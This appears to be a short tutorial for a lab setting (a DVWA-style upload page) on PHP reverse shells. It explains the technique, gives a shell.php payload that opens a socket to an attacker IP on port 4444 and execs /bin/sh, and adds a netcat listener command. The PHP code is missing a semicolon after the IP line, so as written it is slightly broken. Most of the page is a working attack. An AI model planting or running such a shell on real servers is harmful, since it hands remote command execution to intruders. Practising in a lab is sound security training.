# Web shells of PHP Reverse Shell


## What is PHP Reverse Shell?
A PHP reverse shell is a script that creates a connection back to the attacker's machine, providing remote command execution capabilities. Unlike web shells that require HTTP requests, reverse shells provide direct shell access.


## How It Works
 - Attacker uploads or injects a PHP reverse shell script into a web server (e.g., via file upload vulnerability, LFI, RCE).
 - Script executes and opens a TCP socket to the attacker’s IP/port.
 - Attacker runs a listener (e.g., nc -lvnp 4444) to accept the connection.
 - Once connected, attacker can run OS commands as the web server user (often www-data, apache, etc.).




# PHP Reverse Shell Methodology


## PHP Reverse Shell Payload

### PHP Reverse Shell Payload
- First check our attacker IP:
````
ifconfig
````

````
sudo mousepad shell.php
````
````
<?php
$ip = '192.168.127.128'
$port = 4444;
$sock = fsockopen($ip, $port);
if ($sock) {
    exec("/bin/sh -i <&3 >&3 2>&3");
}
?>
````


### Netcat listener to receive the shell:
````
nc -lvnp 4444
````


- and after go back to our target: http://192.168.100.97:8080/vulnerabilities/upload/
